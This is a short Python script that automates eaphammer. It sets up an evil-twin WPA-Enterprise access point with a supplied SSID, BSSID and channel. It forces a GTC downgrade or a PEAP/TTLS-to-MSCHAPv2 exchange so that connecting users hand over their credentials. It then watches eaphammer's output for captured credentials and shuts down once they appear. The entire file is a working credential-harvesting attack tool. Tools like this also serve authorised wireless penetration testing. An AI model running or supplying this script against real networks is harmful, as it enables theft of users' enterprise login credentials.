#!/usr/bin/env python3
"""
Non‐interactive wrapper for eaphammer
- Select GTC or MSCHAPv2 flow via -a/--auth-method
- Auto‐detect credentials (case‐insensitive) and send “Enter” to cleanly stop
- Logs eaphammer output to stdout so you can see what’s happening
"""
import argparse
import sys
import pexpect
import re

def parse_args():
    parser = argparse.ArgumentParser(
        description="Wrapper for eaphammer that stops on credential capture"
    )
    parser.add_argument(
        "-a", "--auth-method",
        choices=["gtc", "mschapv2"],
        required=True,
        help="Choose 'gtc' (GTC downgrade) or 'mschapv2' (PEAP→MSCHAPv2)"
    )
    parser.add_argument(
        "-i", "--iface", required=True,
        help="Wireless interface (e.g. wlan1)"
    )
    parser.add_argument(
        "-b", "--bssid", required=True,
        help="Target BSSID"
    )
    parser.add_argument(
        "-c", "--channel", type=int, required=True,
        help="Channel number"
    )
    parser.add_argument(
        "-s", "--ssid", required=True,
        help="SSID to broadcast"
    )
    return parser.parse_args()

def run_eaphammer(args):
    # Build the command string
    cmd = (
        f"eaphammer "
        f"--interface {args.iface} "
        f"--auth wpa-eap "
        f"--essid {args.ssid} "
        f"--bssid {args.bssid} "
        f"--channel {args.channel} "
        f"--creds "
    )
    if args.auth_method == "gtc":
        cmd += "--negotiate gtc-downgrade"
    else:
        cmd += (
            "--negotiate manual "
            "--phase-1-methods PEAP,TTLS "
            "--phase-2-methods MSCHAPV2"
        )

    # Spawn eaphammer and echo its output to our stdout for visibility
    child = pexpect.spawn(cmd, encoding="utf-8", timeout=None)
    child.logfile = sys.stdout

    # Compile our credential-detection regexes, case-insensitive
    gtc_re      = re.compile(r"GTC:",      re.IGNORECASE)
    mschap_re   = re.compile(r"MSCHAPV2:", re.IGNORECASE)

    try:
        while True:
            idx = child.expect([gtc_re, mschap_re, pexpect.EOF])
            if idx in (0, 1):
                # credentials found
                print(f"[+] Detected {args.auth_method.upper()} credentials, sending Enter to terminate…")
                child.sendline("")  # emulate the “Press enter to quit”
                break
            else:
                # EOF—something went wrong before capture
                print("[!] eaphammer exited before credentials were captured.", file=sys.stderr)
                return child.exitstatus or 1

        # wait for the rest of the teardown
        child.expect(pexpect.EOF)
        return child.exitstatus or 0

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user, attempting clean shutdown…", file=sys.stderr)
        child.sendline("")  # try to trigger hostapd to quit
        child.wait()
        sys.exit(1)

def main():
    args = parse_args()
    exit_code = run_eaphammer(args)
    sys.exit(exit_code)

if __name__ == "__main__":
    main()
